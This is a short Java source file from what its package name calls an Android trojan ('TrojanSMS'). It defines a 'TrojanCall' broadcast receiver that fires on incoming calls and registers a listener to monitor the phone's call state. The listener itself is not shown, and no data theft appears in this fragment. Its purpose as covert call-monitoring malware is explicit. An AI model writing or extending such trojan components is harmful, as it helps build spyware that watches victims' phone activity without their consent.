package com.flu.TrojanSMS;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

public class TrojanCall extends BroadcastReceiver  {
	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		Log.d("DEBUG", "¡¡Recibiendo Llamada!!");
		MyPhoneStateListener phoneListener=new MyPhoneStateListener(context);
	    TelephonyManager telephony = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
	    telephony.listen(phoneListener,PhoneStateListener.LISTEN_CALL_STATE);		
	}

}

